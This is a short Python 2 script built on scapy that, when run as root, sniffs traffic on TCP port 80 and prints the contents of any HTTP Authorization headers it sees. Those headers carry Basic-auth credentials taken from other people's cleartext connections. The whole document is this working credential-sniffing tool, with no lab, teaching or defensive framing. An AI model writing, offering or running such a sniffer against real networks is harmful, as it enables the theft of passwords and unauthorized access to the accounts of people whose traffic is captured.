#!/usr/bin/env python

import re
import os
from scapy.all import *

reg = re.compile(r'^authorization:\s+(.*)$', re.I|re.M)

def packetCallBack(packet):
    '''scans the payload of the TCP packet for
       basic authorization. Then prints out the
       headers containing the basic authorization.
    '''
    basicPacket = str(packet[TCP].payload)
    output = reg.search(basicPacket)
    if output:
        print output.group(1)



if __name__ == '__main__':
    try:
        if os.getuid() == 0:
            print "[-] Listening for traffic on port 80...."
            sniff(filter='tcp port 80', prn=packetCallBack, store=0)
        else:
            print "[!] Please run this script as root."
    except Exception, e:
        print '[!] Error! %s' % e

